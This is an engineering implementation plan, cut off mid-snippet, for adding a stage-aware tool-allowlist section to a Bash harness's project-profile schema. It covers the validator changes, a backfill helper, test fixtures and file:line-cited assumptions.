---
linear: ENG-93
date: 2026-05-09
topic: Extend project-profile schema (v1 → v2) with a stage-aware `## Tool allowlist` section, version-branched validator, backfill helper, fixture matrix, and harness-self profile upgrade
---

# Plan — ENG-93 Extend project-profile schema with stage-aware tool declarations

Implementation plan for the design in
`docs/brainstorms/2026-05-09-eng-93-extend-project-profile-schema-with-stage-aware-tool-declarations-design.md`.

## Anti-anchoring

- **Problem (in the operator's words, from the Linear issue):**
  `learned-rules/<slug>/project-profile.md` does not declare WHICH executables
  the orchestrator should allowlist for `claude -p` invocations at each stage.
  Without such a declaration, downstream surfaces (`bin/dispatch.sh`,
  `bin/run-local-helpers.sh`, `bin/scope-check.sh`) cannot derive the allowlist
  from the profile and continue to use hardcoded Tauri-shaped defaults.
- **Does the brainstorm address it?** Yes, declaration-only (T1 of the ENG-92
  umbrella). The brainstorm adds a `## Tool allowlist` section, instructs
  discovery to derive `Bash(<binary>:*)` patterns from the build/test commands,
  bumps `schema_version: 1 → 2`, and adds a backfill helper so existing v1
  profiles are upgraded interactively on next setup. The brainstorm explicitly
  defers consumption to T2/T3/T4.
- **Does the brainstorm reframe the problem?** No. The Linear issue's five
  acceptance criteria map 1:1 onto §2 of the brainstorm (D-1 schema slot,
  D-4 derivation, D-2/D-6 validator branching, D-8 fixture matrix, §6
  harness-self upgrade). Out-of-scope items (`dispatch.sh` rewire,
  Tauri-vocab cleanup) match the issue's "Scope Boundaries / OUT" verbatim.
- **Proportional?** Yes. Five files modified, one new helper file is **not**
  introduced (the helper lives inside `bin/setup-helpers.sh`). New code is
  three small functions (`_profile_schema_version`,
  `_inject_tool_allowlist_section`, plus the v2 branch of
  `_validate_project_profile_schema`), one branch in
  `bin/setup.sh::phase_project_profile`, a 6-section schema in
  `bin/setup-prompts/discovery.md`, six new test fixtures, and a hand
  upgrade of `learned-rules/harness/project-profile.md` to v2. No new crate,
  no new label, no new dispatch-time consumer — that is T2.
- **No escalation needed.**

## Goal

Land schema_version=2 of the project-profile spec — discovery emits a sixth
H2 section `## Tool allowlist` between `## Build & test gates` and `## File
layout`; `bin/setup-helpers.sh::_validate_project_profile_schema` reads
`schema_version` and branches (v1 → 5 sections in the original order; v2 →
6 sections in the new order; everything else rejected with one-line stderr);
`bin/setup.sh::phase_project_profile` detects an existing v1 profile, calls a
new `_inject_tool_allowlist_section` helper that splices in the section with
`<<NEEDS-INPUT:>>` markers and bumps the frontmatter to `schema_version: 2`,
then falls through to the existing marker-resolution loop; six new fixtures
in `bin/phase-project-profile-test.sh` cover Rust+Bun/Python+pytest/Go+go-test
v2 happy paths, the v1 back-compat path, the v2-missing-section rejection,
the D-7 pattern-shape-rejection, and an end-to-end v1→v2 backfill case;
`bin/setup-helpers-test.sh::case-1.3` is updated to assert the new
"unsupported schema_version" rejection text; `learned-rules/harness/
project-profile.md` is hand-upgraded to v2 with the live `.pipeline-config/
config.json::dispatch.tools` extras as the source of truth.

Verifiable via:
`bash bin/phase-project-profile-test.sh && bash bin/setup-helpers-test.sh
&& bash bin/render-prompt-test.sh && bash bin/install-launchd-test.sh
&& bash -n bin/setup-helpers.sh && bash -n bin/setup.sh
&& bash bin/secret-probe-lint.sh` all exit 0, plus
`_validate_project_profile_schema $HARNESS_ROOT/learned-rules/harness/
project-profile.md` returns 0 against the upgraded v2 file.

## Architecture

The change is additive within five existing files plus one prompt-template
file: `bin/setup-prompts/discovery.md` (schema slot + derivation rule),
`bin/setup-helpers.sh` (validator branch + two new helpers),
`bin/setup.sh` (one new branch in `phase_project_profile` BEFORE the
existing "complete" check), `bin/phase-project-profile-test.sh` (six new
fixtures + one new end-to-end backfill case), `bin/setup-helpers-test.sh`
(case-1.3 assertion text update + new v2 happy/reject cases), and
`learned-rules/harness/project-profile.md` (hand upgrade to v2). No new
files. No changes to `bin/dispatch.sh`, `bin/render-prompt.sh`,
`bin/run-local-helpers.sh`, `bin/scope-check.sh`, `AGENT_PROMPTS.md`,
`bin/run-stage.sh`, `bin/poll.sh`, `bin/linear.sh`, or
`.pipeline-config/config.json` — those are T2/T3/T4.

The architectural pivot: the project-profile becomes the single
checked-in source of stack-derived tool allowlist data, replacing
gitignored `.pipeline-config/config.json::dispatch.tools[]` as the
authority for non-Tauri targets. This PR does NOT remove the
`.pipeline-config` path — both paths coexist until T2 rewires the
consumer side. The `schema_version` integer is the load-bearing signal
the future T2 reader will use to distinguish "operator hasn't upgraded
their profile" (v1, fall back to hardcoded base + `.pipeline-config`
extras) from "operator has authored a Tool allowlist" (v2, the
checked-in profile drives `--allowed-tools`).

There is no `docs/VISION.md`, `docs/architecture.md` ADR section, or
`docs/knowledge/decisions.md` (verified — `ls docs/` returns
`architecture.md  assumptions.md  brainstorms/  configuration.md
cost.md  demos/  install.md  operations.md  pipeline-vocabulary.md
pipeline-vocabulary.template.md  plans/  runbooks/  security.md`;
`docs/architecture.md` is a runtime narrative, not an ADR ledger). The
governing constraints are CLAUDE.md, `learned-rules/harness/
project-profile.md` (the v1 we are upgrading), `learned-rules/twinning/
plan.md` (P-001 frontmatter, P-002 trait-bound enumeration), and
ENG-49's stack-aware addendum brainstorm (the schema_version=1
spec). There is no `learned-rules/harness/plan.md` (verified — only
`build.md` and `project-profile.md` are present).

## Tech stack

- Bash 3.2+ (Darwin default, harness-self target).
- `awk` (frontmatter parsing, section walks; already a hard dep —
  every `bin/*.sh` awk call).
- `grep -E` (section enumeration; already a hard dep).
- No new dependencies. No new dispatch.tools allowlist entry — the
  schema/validator/backfill all run on the harness host (during
  `bash bin/setup.sh project-profile`), never inside an agent sandbox.

## Assumption Inventory

Every modified-file fact below is `path:line`-cited against the current
worktree at `/Users/rajatgoyal/.local/state/twinning-harness/harness/
ENG-93/worktree`. Every assumption marked `verified` was opened with
the Read tool and the quoted text matches.

### `bin/setup-prompts/discovery.md` schema-template insertion boundaries

- **A-001 — Schema fenced block at `bin/setup-prompts/discovery.md:30-65`.**
  Verified — the H2 section header `## Schema (REQUIRED — emit exactly
  this structure)` lands at line 30; the schema fenced block opens at
  line 32 (` ```markdown `) and closes at line 65 (` ``` `). Frontmatter
  inside the block is at lines 33-38; `schema_version: 1` is at
  line 37. The five H2 sections are at lines 42, 46, 53, 58, 62.
  ENG-93 (D-1) inserts a new sixth fenced sub-block `## Tool allowlist`
  between line 51 (closing of `## Build & test gates`) and line 53
  (`## File layout`); D-2 changes line 37 from `schema_version: 1` to
  `schema_version: 2`.

- **A-002 — Confidence rules section at `bin/setup-prompts/discovery.md:67-71`.**
  Verified — H2 header `## Confidence rules` at line 67; three bullets
  at lines 69-71 (Build & test gates / Don'ts / File layout). ENG-93
  (D-4) appends one new bullet under this H2 carrying the derivation
  rule (`<command>` → `Bash(<token>:*)`) including the `bash bin/<name>.sh`
  carve-in and the `bash -<flag>` / `bash <other-path>` carve-outs.

- **A-003 — `## Self-twinning detection` at `bin/setup-prompts/discovery.md:73-75`.**
  Verified — last section, lines 73-75. ENG-93 does NOT modify this
  section; the carve-in for `bash bin/<name>.sh` patterns in D-4 already
  covers the harness-self case.

### `bin/setup-helpers.sh::_validate_project_profile_schema` and new helpers

- **A-004 — Current validator at `bin/setup-helpers.sh:128-159`.**
  Verified — function spans lines 128-159. Frontmatter check uses awk
  (lines 134-138), schema_version check uses awk regex
  `^schema_version:[[:space:]]+1[[:space:]]*$` (line 146), section
  ordering uses `grep -E '^## ' "$path" | head -5 | tr '\n' '|'` against
  the literal expected string at line 153:
  ```bash
  152    sections="$(grep -E '^## ' "$path" | head -5 | tr '\n' '|')"
  153    local expected='## Stack|## Build & test gates|## File layout|## Language idioms|## Don'\''ts|'
  154    if [[ "$sections" != "$expected" ]]; then
  155      printf '_validate_project_profile_schema: expected sections [%s], got [%s]\n' "$expected" "$sections" >&2
  156      return 1
  157    fi
  ```
  ENG-93 (D-6) replaces lines 141-157 with: (a) extract the version
  integer instead of testing for literal `1`, (b) `case "$version"` on
  `1`/`2`/else, (c) v2 branch uses `head -6` + 6-section expected
  string, (d) new error strings (`unsupported schema_version: <n>`,
  `schema_version=2 but missing ## Tool allowlist`,
  `schema_version missing`).

- **A-005 — D-7 pattern-shape gate is a NEW addition inside the v2 branch.**
  Verified — no existing pattern-shape regex anywhere in
  `bin/setup-helpers.sh` (grep `Bash\\(` returns zero matches in
  `bin/setup-helpers.sh`). New code: walk the lines under
  `## Tool allowlist` until the next `^## ` heading, and for each line
  containing a backtick-fenced pattern, assert it matches the shape
  regex from the brainstorm D-7. Implementation lives inside the v2
  branch of `_validate_project_profile_schema` (no separate function;
  premature abstraction per D-6). All new code is in
  `bin/setup-helpers.sh`. The shape regex is:
  ```
  ^[[:space:]]*-?[[:space:]]*`Bash\([A-Za-z0-9_./[:space:]:-]+:\*\)`
  ```
  Lines matching `^- <stage>: \(none\)$` and the prose intro paragraph
  are skipped by the walker.

- **A-006 — `_profile_schema_version` is a NEW helper.** Verified — no
  existing `_profile_schema_version` in `bin/setup-helpers.sh` (grep
  returns zero matches). Helper signature:
  `_profile_schema_version <path>` → emits the integer value of
  `schema_version` from the YAML frontmatter on stdout, or empty
  string on miss; rc=0 always (caller decides whether empty is fatal).
  Lives at `bin/setup-helpers.sh` immediately after
  `_validate_project_profile_schema` (after current line 159; new
  insertion point).

- **A-007 — `_inject_tool_allowlist_section` is a NEW helper.** Verified —
  no existing function (grep returns zero matches). Helper signature:
  `_inject_tool_allowlist_section <path>` → reads v1 file from `<path>`,
  splices `## Tool allowlist` block after `## Build & test gates`,
  rewrites `schema_version: 1` → `schema_version: 2` in frontmatter,
  atomic-writes back via `atomic_write_file` (already at lines 27-36).
  Returns rc=1 with one-line stderr if `## Build & test gates` heading
  is not found in the input (E-4). Lives at `bin/setup-helpers.sh`
  immediately after `_profile_schema_version`.

- **A-008 — `atomic_write_file` available at
  `bin/setup-helpers.sh:27-36`.** Verified — function reads stdin to
  tempfile in same directory, chmods, renames. Used by `write_env_file`
  at line 98. Re-used by `_inject_tool_allowlist_section`.

- **A-009 — `_resolve_profile_markers` line-by-line marker matching at
  `bin/setup-helpers.sh:168-205`.** Verified — single-line marker form
  `*<<NEEDS-INPUT:*` matched at line 178; prefix split at 180; question
  extracted at 181-183. The injected stub markers from
  `_inject_tool_allowlist_section` are single-line per stage and
  conform to this shape — no multi-line marker handling needed (E-7).

### `bin/setup.sh::phase_project_profile` branch ordering

- **A-010 — Phase function shape at `bin/setup.sh:257-368`.** Verified —
  lines 257-272 = "valid + no markers → done" branch; lines 274-280 =
  "valid + has markers → resolve only" branch; lines 282-348 = fresh
  discovery branch; lines 351-358 = optional editor review; line 358 =
  trailing log. The brainstorm (D-5) inserts a new branch BEFORE
  line 267 (the "complete" check), so v1 profiles that would otherwise
  return immediately are upgraded first.

- **A-011 — `phase_project_profile` line 267-272 "complete" branch.** Verified:
  ```bash
  267    if [[ -f "$profile_path" ]] \
  268       && _validate_project_profile_schema "$profile_path" 2>/dev/null \
  269       && ! grep -q '<<NEEDS-INPUT:' "$profile_path"; then
  270      log "project-profile: $profile_path already complete"
  271      return 0
  272    fi
  ```
  The new D-5 branch lands between line 264 (`mkdir -p "$profile_dir"`)
  and line 266 (the comment for the line-267 check). Branch ordering is
  load-bearing — the brainstorm calls it out as such. The `_v == "1"`
  guard ensures we only inject for v1 (v2 with markers takes the
  line-275 "valid + has markers" branch on the next iteration; v2 with
  no markers takes the line-267 "complete" branch).

- **A-012 — `_resolve_profile_markers` is the existing post-injection
  step at `bin/setup.sh:275-279, 343-347`.** Verified — both call sites
  pass the profile path and `die` on rc=1. The new D-5 branch falls
  through to the existing line-275 branch on the next iteration loop —
  but `phase_project_profile` does not loop; it serializes branches.
  The actual fall-through is "after `_inject_tool_allowlist_section`
  succeeds, the profile now has markers + valid v2 schema, so the
  line-275 check (`valid + grep -q '<<NEEDS-INPUT:'`) fires next."
  Branch ordering: the D-5 branch + line-267 + line-275 form a
  3-branch ladder where D-5 mutates state and line-275 picks it up.
  No literal goto or loop; just sequential conditional execution.

### `bin/phase-project-profile-test.sh` test-extension boundaries

- **A-013 — Test fixtures at `bin/phase-project-profile-test.sh:42-98`.**
  Verified — `GOOD_PROFILE` (lines 42-68), `MARKED_PROFILE` (lines
  70-96), `INVALID_PROFILE` (line 98). All three are heredoc-defined
  shell variables that survive the `run_phase` subshell via
  `write_claude_stub`. ENG-93 (D-8) appends five new fixtures
  (`V2_RUST_TAURI_PROFILE`, `V2_PYTHON_PYTEST_PROFILE`,
  `V2_GO_GOTEST_PROFILE`, `V1_LEGACY_PROFILE`, `V2_MISSING_TOOL_ALLOWLIST`)
  + one pattern-shape-negative fixture (`V2_BAD_PATTERN_PROFILE`) at
  the same heredoc shape. `V1_LEGACY_PROFILE` is structurally identical
  to the existing `GOOD_PROFILE` (both are valid v1) — we keep both
  to make the v1-back-compat-vs-default-stack semantics explicit in the
  test layer; no de-dup attempted.

- **A-014 — Test cases at `bin/phase-project-profile-test.sh:130-172`.**
  Verified — case-5.1 (happy path), case-5.2 (skip-discovery on valid),
  case-5.3 (markers resolved), case-5.4 (invalid → die). ENG-93 appends
  six new cases (case-5.5 through case-5.10) + a backfill end-to-end case
  (case-5.11) AFTER case-5.4. Case numbering follows the existing 5.N
  convention (the file-internal `Case N.N:` comment style).

- **A-015 — `run_phase` subshell pattern at
  `bin/phase-project-profile-test.sh:101-128`.** Verified — sources
  `common.sh`, `setup-helpers.sh`, `setup.sh` in order; runs
  `phase_project_profile`. Stdin-fed answers come via `printf '%s\n'
  "$stdin_input"`. The backfill case-5.11 reuses this pattern unchanged
  — the only addition is supplying `\n`-separated answers for the 3
  injected markers (one per `implementing`/`ui`/`qa` stage).

- **A-016 — `write_claude_stub` at
  `bin/phase-project-profile-test.sh:26-40`.** Verified — writes a stub
  `claude` script to `$sandbox/stubs/`. The stub is unconditionally
  removed before case-5.11 (mirroring case-5.3's `rm -f
  "$sandbox/stubs/claude"` at line 150) so the backfill path runs
  without any chance of re-invoking discovery. **Asymmetry note:** the
  case-5.4 invalid-profile path does NOT remove the stub (line 163
  re-installs a fresh stub for that case), so the backfill stub-removal
  must come AFTER case-5.4 in execution order. The plan inserts the
  backfill cases BEFORE the existing summary block at line 174-177; the
  per-case stub state is reset by `write_claude_stub` at the case's
  preamble (matching the existing pattern at lines 131, 148, 163).

### `bin/setup-helpers-test.sh` test-update boundary

- **A-017 — Existing case-1.3 at `bin/setup-helpers-test.sh:77-83`.** Verified:
  ```bash
  77  # Case 1.3: wrong schema_version → fails
  78  sed 's/schema_version: 1/schema_version: 99/' "$sandbox/good.md" > "$sandbox/bad-version.md"
  79  if _validate_project_profile_schema "$sandbox/bad-version.md" 2>/dev/null; then
  80    fail_at "case-1.3: schema_version != 1 rejected" "returned 0"
  81  else
  82    pass_at "case-1.3: schema_version != 1 rejected"
  83  fi
  ```
  Under ENG-93 v2 validator, `schema_version: 99` is rejected with
  message `unsupported schema_version: 99` (rc=1). The existing test
  asserts only on rc, not stderr text, so it continues to pass
  unchanged — but the human-readable label `case-1.3: schema_version
  != 1 rejected` is now misleading. ENG-93 retitles it to
  `case-1.3: unsupported schema_version rejected` and adds a stderr
  substring assertion (`grep -q 'unsupported schema_version'`) to lock
  in the new contract. New cases case-1.6 (v2 happy path), case-1.7
  (v2 missing Tool allowlist), case-1.8 (v2 with shell-metachar pattern)
  are appended after case-1.5.

- **A-018 — Existing case-1.1 (`good.md`) at
  `bin/setup-helpers-test.sh:21-59`.** Verified — uses `schema_version: 1`
  (line 26). ENG-93 leaves this fixture as-is; v1 stays valid.

### `learned-rules/harness/project-profile.md` upgrade

- **A-019 — Current harness profile at
  `learned-rules/harness/project-profile.md:1-52`.** Verified — `schema_version: 1`
  at line 5; five H2 sections at lines 10, 14, 21, 30, 42 (Stack, Build
  & test gates, File layout, Language idioms, Don'ts). The Build & test
  gates section (line 17) enumerates the canonical test command: a long
  `&&`-chain of `bash bin/<name>-test.sh` invocations. ENG-93 (§6 of the
  brainstorm) hand-upgrades the file to v2 by inserting `## Tool allowlist`
  after line 19 (current Build & test gates closing line) and bumping
  `schema_version: 1` → `schema_version: 2` at line 5.

- **A-020 — Harness-self `.pipeline-config/config.json::dispatch.tools[]`
  enumeration.** Assumed/verifiable-at-implementation — CLAUDE.md
  "Per-target dispatch.tools extras" §lines 260-308 documents the
  enumerated list as required for harness-self and gives the regen
  one-liner. The actual file is gitignored, but the implementer can
  read it from the operator's worktree (`cat $TARGET_REPO/.pipeline-config/
  config.json`) when running on the host. **Validation step at
  implementation time:** the implementer runs the live regen one-liner
  to enumerate the current `bin/*-test.sh` set, and copies the literal
  `Bash(bash bin/<name>-test.sh:*)` patterns into the new
  `## Tool allowlist` section under `implementing` and `qa`. **If the
  file is unreadable from the agent sandbox** (likely — the harness-self
  worktree under `$TARGET_REPO/.pipeline-config/` is gitignored and may
  not exist as a path the agent can read), the implementer falls back
  to the secondary source: enumerate `ls bin/*-test.sh` and emit one
  `Bash(bash bin/<name>:*)` pattern per match — that is exactly what
  the regen one-liner produces, so the result is identical to the
  config.json content.

### `bin/render-prompt.sh` non-touch

- **A-021 — render-prompt.sh schema_version warning at
  `bin/render-prompt.sh:151-153`.** Verified:
  ```bash
  151    if ! grep -qE '^schema_version:[[:space:]]+1[[:space:]]*$' "$profile_path"; then
  152      log "render-prompt: WARNING — project-profile schema_version != 1, continuing"
  153    fi
  ```
  ENG-93 does NOT modify this. After ENG-93 lands, every fresh
  v2 profile triggers this non-fatal warning on every dispatch — the
  brainstorm's E-2 deferred the regex relaxation to T2 to keep this PR
  declaration-only. The warning is informational; dispatch is unchanged.
  The PR description must call this out so reviewers don't read the
  warning as a regression.

- **A-022 — `bin/render-prompt-test.sh:23,107` and
  `bin/install-launchd-test.sh:50` schema_version=1 fixtures.**
  Verified — three test fixtures embed `schema_version: 1` literals.
  None of them call `_validate_project_profile_schema` directly; all
  three exercise downstream behavior (render-prompt addendum
  appendence, plist generation). They continue to pass unchanged
  because v1 stays valid.

### Cross-file consumer audit

- **A-023 — Audit of all `schema_version` consumers in `bin/`.** Verified
  by grep — eight files match: `bin/setup-helpers.sh:124,141,146,148`
  (validator we are extending), `bin/render-prompt.sh:151,152` (the
  non-touch from A-021), `bin/setup-prompts/discovery.md:37` (the
  template we are bumping), four test fixtures
  (`bin/render-prompt-test.sh:23,107`, `bin/install-launchd-test.sh:50`,
  `bin/render-prompt-slug-test.sh:40`, `bin/phase-project-profile-test.sh:46,74`),
  and `bin/setup-helpers-test.sh:77-83` (the test we are updating). All
  four test fixtures embed `schema_version: 1` and never call
  `_validate_project_profile_schema` directly — they exercise downstream
  consumers (render-prompt addendum, plist generation, slug-aware
  rendering) and continue passing because v1 stays valid. No hidden
  consumer; the change surface is fully enumerated.

- **A-024 — `dispatch.sh::allowed_tools_for` at `bin/dispatch.sh:302-340`
  is OUT OF SCOPE.** Verified — case arms enumerate Tauri-shaped
  patterns (`Bash(cargo:*)`, `Bash(bun:*)`, etc.). T2 will rewire this
  to read from the v2 profile; ENG-93 does NOT touch it. The
  `_dispatch_tools_extras` reader at lines 291-300 keeps reading
  `.dispatch.tools.<stage>[]` from `$CONFIG`, unchanged.

- **A-025 — `bin/scope-check.sh:22` and
  `bin/run-local-helpers.sh:11-20, 213-223` are OUT OF SCOPE (T3/T4).**
  Verified — neither file references `schema_version` or the profile
  path directly. T3 / T4 is the scope-check / run-local-helpers
  rewire; ENG-93 does not touch.

- **A-026 — `learned-rules/twinning/project-profile.md` stays at v1.**
  Verified — line 5 reads `schema_version: 1`; this PR does not
  upgrade twinning per acceptance criterion #5 (only harness-self).
  The next operator run of `bash bin/setup.sh project-profile` against
  the twinning target triggers the backfill branch (E-6).

- **A-027 — Linear issue interpretation of
  "schema_version=1 prefix (legacy back-compat)".** Assumed — the most
  plausible reading is "v1 stays valid without the new section" rather
  than "the literal text 'schema_version=1' anywhere in the file". The
  brainstorm A-18 self-flagged this as the only interpretation that
  isn't a non-sense check. The plan adopts this interpretation
  uniformly. **Validation step at implementation time:** if the
  implementer reads it differently, halt and confirm with the operator
  before coding (preferable to a wrong validator semantic).

## File Structure

```
bin/setup-prompts/discovery.md     MOD   D-1: Insert `## Tool allowlist` H2 sub-block in the schema fenced block (between current lines 51 and 53). D-2: Bump `schema_version: 1` → `schema_version: 2` at current line 37. D-4: Append a new bullet under `## Confidence rules` (after current line 71) describing the derivation rule (`<command>` → `Bash(<token>:*)`), the `bash bin/<name>.sh` carve-in, and the `bash -<flag>` / `bash <other-path>` carve-outs. The fenced ```markdown ... ``` opening/closing fences (lines 32, 65) are preserved unchanged.
bin/setup-helpers.sh               MOD   D-6: Replace lines 141-157 of `_validate_project_profile_schema` with a `case "$version"` ladder on 1/2/else; v1 branch is the verbatim current behavior; v2 branch uses `head -6` + 6-section ordered match + the D-7 pattern-shape gate. New helpers `_profile_schema_version` and `_inject_tool_allowlist_section` are appended after line 159 (the closing brace of the validator), before the comment block at line 161 introducing `_resolve_profile_markers`.
bin/setup.sh                       MOD   D-5: Insert a new branch in `phase_project_profile` between current lines 264 (`mkdir -p "$profile_dir"`) and 266 (the comment introducing the line-267 check). The new branch detects (a) profile exists, (b) validator passes, (c) no markers, (d) `_profile_schema_version` returns "1"; on match it logs the upgrade intent (operator can Ctrl-C cleanly), invokes `_inject_tool_allowlist_section`, and falls through to the line-275 marker-resolution branch on the next conditional check.
bin/phase-project-profile-test.sh  MOD   D-8: Append five new fixtures (`V2_RUST_TAURI_PROFILE`, `V2_PYTHON_PYTEST_PROFILE`, `V2_GO_GOTEST_PROFILE`, `V1_LEGACY_PROFILE`, `V2_MISSING_TOOL_ALLOWLIST`) plus `V2_BAD_PATTERN_PROFILE` (D-7) after line 98. Append seven new test cases (case-5.5 through case-5.11) after line 172 (case-5.4) and before line 174 (the summary block).
bin/setup-helpers-test.sh          MOD   Update case-1.3 at lines 77-83: rename label to `case-1.3: unsupported schema_version rejected`, add a `grep -q 'unsupported schema_version'` stderr-substring assertion. Append three new cases (case-1.6: v2 happy; case-1.7: v2 missing Tool allowlist; case-1.8: v2 with shell-metachar pattern) after line 103 (case-1.5) and before line 105 (the `_resolve_profile_markers` section header).
learned-rules/harness/project-profile.md   MOD   §6 of the brainstorm: hand-upgrade to v2. Bump line 5 `schema_version: 1` → `schema_version: 2`. Insert `## Tool allowlist` H2 section after line 19 (close of `## Build & test gates`) and before line 21 (`## File layout`). Section body enumerates implementing/ui/qa with the literal `Bash(bash bin/<name>-test.sh:*)` patterns from the live `.pipeline-config/config.json::dispatch.tools.implementing[]` (per A-020 — falls back to `ls bin/*-test.sh` enumeration if the gitignored config is unreadable from the agent sandbox); brainstorming/planning/reviewing/building/released emit literal `(none)`.
```

No new files. No `bin/dispatch.sh`, `bin/render-prompt.sh`,
`bin/scope-check.sh`, `bin/run-local-helpers.sh`, `bin/run-stage.sh`,
`bin/poll.sh`, `bin/linear.sh`, `AGENT_PROMPTS.md`,
`bin/pipeline-events.json`, `learned-rules/twinning/project-profile.md`,
or `.pipeline-config/config.json` change.

## API Contract

no new API surface (this is a bash orchestration repo; the only
inter-script "contract" exercised by ENG-93 is the schema_version-aware
`_validate_project_profile_schema` rc=0/rc=1 contract — input is a
filesystem path, output is rc + one-line stderr; consumers are
`bin/setup.sh::phase_project_profile`, `bin/setup.sh::is_project_profile_done`,
and the future T2 reader. No structured response, no JSON shape, no
network surface).

## Backend Tasks

(All tasks are backend — this repo has no UI surface. The Frontend Tasks
section below is a deliberate "no UI surface" note, per the project
profile.)

### Task 1: Bump discovery prompt schema slot to v2

- `depends_on: []`
- `touches: bin/setup-prompts/discovery.md (lines 30-71)`
- [ ] In `bin/setup-prompts/discovery.md:37`, change
      `schema_version: 1` → `schema_version: 2` (literal text inside
      the fenced markdown schema block).
- [ ] In `bin/setup-prompts/discovery.md`, between current line 51
      (closing `Integration/E2E:` bullet of `## Build & test gates`) and
      current line 53 (`## File layout` heading), insert a new H2
      sub-block in the fenced schema:

      ```markdown
      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.
      Stage-agnostic core tools (Read, Write, Edit, Grep, Glob, TaskCreate, git family,
      `bash bin/linear.sh`, `bash bin/pipeline.sh`, `bash bin/guards.sh`,
      `bash bin/slack.sh`, `bash bin/metrics.sh`) are implicit and not declared here.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash(<binary>:*)`
      - ui:
        - `Bash(<binary>:*)`
      - reviewing: (none)
      - qa:
        - `Bash(<binary>:*)`
      - building: (none)
      - released: (none)
      ```

- [ ] In `bin/setup-prompts/discovery.md`, append a new bullet under
      `## Confidence rules` (after current line 71) with the D-4
      derivation rule. Verbatim text:

      > "Tool allowlist": for each stage that runs build/test/lint
      > commands (implementing, ui, qa), tokenize the canonical commands
      > in §"Build & test gates" by whitespace, take the first token of
      > each, and emit `` `Bash(<token>:*)` `` (backtick-fenced).
      > Drop tokens that name shell built-ins (`bash`, `sh`, `env`)
      > UNLESS they invoke an allowlisted harness script under `bin/`
      > (the only carve-in: `bash bin/<name>.sh` →
      > `` `Bash(bash bin/<name>.sh:*)` ``, where `<name>` is a
      > literal filename with no leading `-`). The carve-in does NOT
      > extend to `bash -c`, `bash -l`, `bash -x`,
      > `bash <other-path>/...`, `bash -<flag> ...`, or any form where
      > the second token starts with `-` — emit `<<NEEDS-INPUT:>>` for
      > those instead. Stages that don't run code (brainstorming,
      > planning) emit `(none)`. Reviewing emits `(none)` UNLESS the
      > project's lint command requires invocation under review (rare).
      > Building emits `(none)` — it uses `gh` exclusively, which is in
      > the implicit base. Released emits `(none)`. Patterns must be
      > ASCII-only (no smart quotes, no trailing `\r`); the trailing
      > `:*` is mandatory. If you cannot confidently tokenize a command,
      > emit `<<NEEDS-INPUT: which binaries does '<command>' invoke?>>`
      > for that stage.

- [ ] Verify: `grep -c '^schema_version: 2$' bin/setup-prompts/discovery.md`
      returns `1`. The fenced ```markdown fence count remains exactly
      `2` (one open, one close): `grep -c '^```' bin/setup-prompts/discovery.md`
      returns `2`.

### Task 2: Add `_profile_schema_version` helper

- `depends_on: []`
- `touches: bin/setup-helpers.sh::_profile_schema_version (new function, after line 159)`
- [ ] Insert immediately after the closing `}` of
      `_validate_project_profile_schema` at `bin/setup-helpers.sh:159`,
      before the comment at line 161 (`# _resolve_profile_markers`).
      Snippet:

      ```bash
      # _profile_schema_version <path>
      # Emits the integer value of `schema_version:` from the YAML
      # frontmatter on stdout, or empty string on miss. Always returns 0;
      # caller decides whether empty is fatal.
      _profile_schema_version() {
        local path="$1"
        [[ -f "$path" ]] || { printf ''; return 0; }
        awk '
          NR==1 && $0=="---" { in_fm=1; next }
          in_fm && $0=="---" { exit }
          in_fm && /^schema_version:[[:space:]]+[0-9]+[[:space:]]*$/ {
            sub(/^schema_version:[[:space:]]+/, "")
            sub(/[[:space:]]*$/, "")
            print
            exit
          }
        ' "$path"
      }
      ```

- [ ] Verify syntax: `bash -n bin/setup-helpers.sh` exits 0.
- [ ] Smoke: in a sandbox, write a v1 fixture, source `setup-helpers.sh`,
      assert `_profile_schema_version <path>` prints `1`. Repeat with
      v2 fixture asserting `2`. Repeat with no-frontmatter fixture
      asserting empty.

### Task 3: Add `_inject_tool_allowlist_section` helper

- `depends_on: [2]`
- `touches: bin/setup-helpers.sh::_inject_tool_allowlist_section (new function, after _profile_schema_version)`
- [ ] Insert immediately after the new `_profile_schema_version`
      from Task 2. Helper signature: `_inject_tool_allowlist_section <path>`
      → reads v1 file at `<path>`, splices `## Tool allowlist` block
      after `## Build & test gates`, rewrites `schema_version: 1` →
      `schema_version: 2` in frontmatter, atomic-writes back via
      `atomic_write_file`. Returns rc=1 with one-line stderr if
      `## Build & test gates` heading is not found (E-4 of the
      brainstorm).
- [ ] Implementation outline:

      ```bash
      # _inject_tool_allowlist_section <path>
      # Splices a `## Tool allowlist` section with <<NEEDS-INPUT:>> markers
      # into a valid v1 profile after the `## Build & test gates` heading,
      # AND bumps the frontmatter schema_version from 1 to 2. Atomic write.
      # Returns rc=1 with one-line stderr on missing anchor heading.
      #
      # Pipeline safety: `awk … "$path" | atomic_write_file "$path"` is
      # safe because awk opens "$path" for reading at start, the kernel
      # holds the file descriptor across the rename, and atomic_write_file
      # writes to a tempfile in the same directory and only renames at end
      # — so the awk read completes against the original inode even if the
      # rename fires before awk drains. Do NOT reorder this into a
      # sed/-i.bak in-place pattern; that would change the inode mid-read.
      _inject_tool_allowlist_section() {
        local path="$1"
        [[ -f "$path" ]] || { printf '_inject_tool_allowlist_section: not a file: %s\n' "$path" >&2; return 1; }
        if ! grep -qE '^## Build & test gates$' "$path"; then
          printf '_inject_tool_allowlist_section: missing anchor "## Build & test gates" in %s\n' "$path" >&2
          return 1
        fi
        # awk: write through; on the first blank line AFTER the next
        # `^## ` heading following `## Build & test gates`, emit the
        # injected block; also rewrite `schema_version: 1` → `schema_version: 2`
        # while inside the YAML frontmatter (lines between the two `^---$`
        # markers).
        awk '
          BEGIN { fm=0; past_btg=0; injected=0 }
          NR==1 && $0=="---" { fm=1; print; next }
          fm==1 && $0=="---" { fm=2; print; next }
          fm==1 && /^schema_version:[[:space:]]+1[[:space:]]*$/ { print "schema_version: 2"; next }
          # In body: detect Build & test gates heading
          fm==2 && /^## Build & test gates$/ { past_btg=1; print; next }
          # First subsequent `^## ` heading triggers injection BEFORE the heading
          fm==2 && past_btg==1 && injected==0 && /^## / {
            print "## Tool allowlist"
            print ""
            print "Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch."
            print "Stage-agnostic core tools (Read, Write, Edit, Grep, Glob, TaskCreate,"
            print "git family, `bash bin/linear.sh`, `bash bin/pipeline.sh`,"
            print "`bash bin/guards.sh`, `bash bin/slack.sh`, `bash bin/metrics.sh`)"
